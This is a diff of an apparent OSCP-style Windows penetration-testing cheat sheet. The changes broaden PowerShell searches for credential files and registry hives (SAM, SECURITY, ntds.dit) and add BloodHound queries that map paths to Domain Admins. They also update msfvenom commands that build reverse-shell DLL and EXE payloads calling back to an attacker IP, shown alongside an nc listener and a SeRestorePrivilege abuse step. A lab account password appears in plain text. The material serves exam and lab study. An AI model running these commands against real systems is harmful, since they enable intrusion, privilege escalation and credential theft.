@@ -53,13 +53,13 @@ There are several key pieces of information we should always obtain:
 # Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*kdbx,*.git,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
-> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*kdbx,*.git,*.rdp,*.config,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like ":\Windows\Microsoft.NET\Framework\*") }
+> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*cups*,*print*,*secret*,*cred*,*.ini,*oscp*,*ms01*,*lance*,*pass*,*ms02*,*dc01*,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like "C:\Windows\Microsoft.NET\Framework\*") -and -not ($_.FullName -like "C:\Windows\WinSxS\amd*") -and -not ($_.FullName -like "C:\Windows\WinSxS\x*")}
 > Get-ChildItem -Path C:\ -Include SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
 > Get-ChildItem -Path C:\ -Filter ".git" -Recurse -Force -ErrorAction SilentlyContinue # to discover .git or any folder in c:\
 > Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
 > findstr /spin “password” *.* # find all files with the word "password" in them
-> findstr /i /s "pass*" *.txt
+> findstr /i /s "*print_service*" *.txt,*.config,*.log
 > Get-History
 > (Get-PSReadlineOption).HistorySavePath
 > LOOK IN THE EVENT VIEWER FOR PASSWORDS # should go to Event Viewer → Events from Script Block Logging are in Application and Services → Microsoft → Windows → PowerShell → Operational then search more . Apply filter for 4104 events , should appear in top 5
@@ -67,6 +67,7 @@ There are several key pieces of information we should always obtain:
 > setspn -L iis_service # or any server,client you discover
 > net accounts # Obtain the account policy, lockout threshold
 > mountvol # to list all drives that are currently mounted) (no mount points might be interesting have a look at it
+Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*cups*,*print*,*secret*,*skylark*,*oscp*,*amsterdam*,*hint* -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like "C:\Windows\Microsoft.NET\Framework\*") -and -not ($_.FullName -like "C:\Windows\WinSxS\amd*") -and -not ($_.FullName -like "C:\Windows\WinSxS\x*")}
 ```
 
 ### PowerView.ps1
@@ -155,8 +156,7 @@ Note that SharpHound supports looping, running cyclical queries over time like a
 > . .\Sharphound.ps1 # or Import-Module .\SharpHound.ps1
 > Get-Help Invoke-BloodHound
 > Invoke-BloodHound -CollectionMethod All $ip -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "dev04-leon" # May take a couple minutes
-> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "user-"
-
+> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "ahansen"
 # Or remotely
 > bloodhound-python --dns-tcp -d support.htb -u ldap -p "nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz" -c all -ns $ip 
 > python bloodhound.py --dns-tcp -d $dom -u enox -p california -c all -ns $ip
@@ -174,6 +174,28 @@ Match for all computers and users in the domain:
 MATCH (m:Computer) RETURN m # All computers
 MATCH (m:User) RETURN m # All users
 MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p # Sessions
+# Find All edges any owned user has on a computer
+MATCH p=shortestPath((m:User)-[r]->(b:Computer)) WHERE m.owned RETURN p
+# Find users that logged in within the last 90 days
+MATCH (u:User) WHERE u.lastlogon < (datetime().epochseconds - (90 * 86400)) and NOT u.lastlogon IN [-1.0, 0.0] RETURN u
+# Find users with passwords last set thin the last 90 days
+MATCH (u:User) WHERE u.pwdlastset < (datetime().epochseconds - (90 * 86400)) and NOT u.pwdlastset IN [-1.0, 0.0] RETURN u
+# Find any users that have a session
+MATCH p=(m:Computer)-[r:HasSession]->(n:User {domain: "OSCP.EXAM"}) RETURN p
+# View all GPOs
+Match (n:GPO) return n
+# Return all groups that have an admin in them
+MATCH (n:Group {admincount:true}) RETURN n
+# Return all high value groups, MAKE SURE YOU CONFIRM NESTED GROUPS ON YOUR OWN
+match (m:Group {highvalue:true}) RETURN m
+# Shortest paths to Domain Admins group from computers:
+MATCH (n:Computer),(m:Group {name:'DOMAIN ADMINS@OSCP.EXAM'}),p=shortestPath((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct*1..]->(m)) RETURN p
+# Excluding routes from DC
+WITH '(?i)ldap/.*' as regex_one WITH '(?i)gc/.*' as regex_two MATCH (n:Computer) WHERE NOT ANY(item IN n.serviceprincipalnames WHERE item =~ regex_two OR item =~ regex_two ) MATCH(m:Group {name:"DOMAIN ADMINS@OSCP.EXAM"}),p=shortestPath((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct*1..]->(m)) RETURN p
+# Show routes Domain Users to groups that have an admin
+MATCH (g:Group) WHERE g.name =~ 'DOMAIN USERS@.*' MATCH (g1:Group) WHERE g1.admincount =true OPTIONAL MATCH p=shortestPath((g)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(g1)) RETURN p
+# Show routes from groups with no admins to ones that do
+MATCH (g:Group) WHERE g.admincount=false MATCH (g1:Group) WHERE g1.admincount=true OPTIONAL MATCH p=shortestPath((g)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(g1)) RETURN p
 ```
 
 Remember to mark the computers that you own!!!!!
@@ -309,7 +331,7 @@ schtasks /query /fo LIST /v /TN "FTP Backup"
 ```bash
 dir /s/b file.txt
 ```
-
+Get-ChildItem -Path C:\ -Include "MSSQLSERVER","SQL","Server","*\?*","MSSQL16","SQLAGENT" -File -Recurse -ErrorAction SilentlyContinue
 #### Recursively Search a User's Workstation
 
 ```bash
@@ -811,7 +833,7 @@ To identify and restart services using a specific DLL file on Windows, you can f
     • Use the tasklist /m wlbsctrl.dll command to list all processes using the  
       wlbsctrl.dll file.
  2 Find Service Names:
-    • For each process identified, use sc query ex type= service state= all |    
+    • For each process identified, use sc query type= service state= all |    
       find /i "PROCESS_NAME" to find the corresponding service name, replacing  
       PROCESS_NAME with the actual process name.                                
  3 Restart Services:
@@ -819,7 +841,7 @@ To identify and restart services using a specific DLL file on Windows, you can f
       net start "ServiceName" for each service, replacing "ServiceName" with the
       actual name of the service you want to restart.     
 sc query | findstr /i "auditTracker"
-sc query | findstr /i "SERVICE_NAME"
+sc query | findstr /i "SQLSERVERAGENT"
 sc qc <ServiceName> | findstr /i "BINARY_PATH_NAME"
 net stop <ServiceName> && net start <ServiceName>
 sc stop <ServiceName> && sc start <ServiceName>
@@ -837,7 +859,7 @@ sc create SchedulerService binPath= "C:\Windows\Tasks\scheduler.exe" DisplayName
 Note that you can create a reverse shell dll:
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.231 LPORT=443 -f dll -o beyondhelper.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.178 LPORT=443 -f dll -o beyondhelper.dll
 # or
 msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 -f dll > shell.dll
 ```
@@ -1657,7 +1679,7 @@ download system
 #### SeRestorePrivilege
 
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.238 LPORT=443 EXITFUNC=thread -f exe > binary.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.178 LPORT=443 EXITFUNC=thread -f exe > binary.exe
 upload binary.exe
 sudo nc -lvnp 80
 .\SeRestoreAbuse.exe "cmd /c C:\windows\tasks\binary.exe"
